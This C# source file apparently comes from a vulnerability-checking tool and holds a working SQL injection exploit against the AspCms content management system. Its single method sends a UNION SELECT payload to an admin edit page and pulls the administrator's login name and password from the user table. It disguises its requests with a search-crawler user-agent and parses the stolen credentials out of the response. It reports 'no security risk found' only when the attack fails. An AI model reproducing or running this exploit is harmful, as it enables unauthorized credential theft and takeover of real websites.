using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class aspcms
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string urls = url;
				string exps = "/admin/_content/_About/AspCms_AboutEdit.asp?id=1%20and%201=2%20union%20select%201,2,3,4,5,loginname,7,8,9,password,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35%20from%20aspcms_user%20where%20userid=1";
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string shuju = new WebClient
				{
					Headers = 
					{

						{
							"user-agent",
							"Baiduspider"
						}
					},
					Encoding = Encoding.Default
				}.DownloadString(urls + exps);
				int kaishi = shuju.IndexOf("SortName");
				string names = shuju.Substring(kaishi + 17, 50).Substring(0, shuju.Substring(kaishi + 17, 50).IndexOf("/") - 1);
				int mimakaishi = shuju.IndexOf("PageTitle");
				string password = shuju.Substring(mimakaishi + 18, 50).Substring(0, shuju.Substring(mimakaishi + 18, 50).IndexOf("/") - 1);
				result = names + "++" + password;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
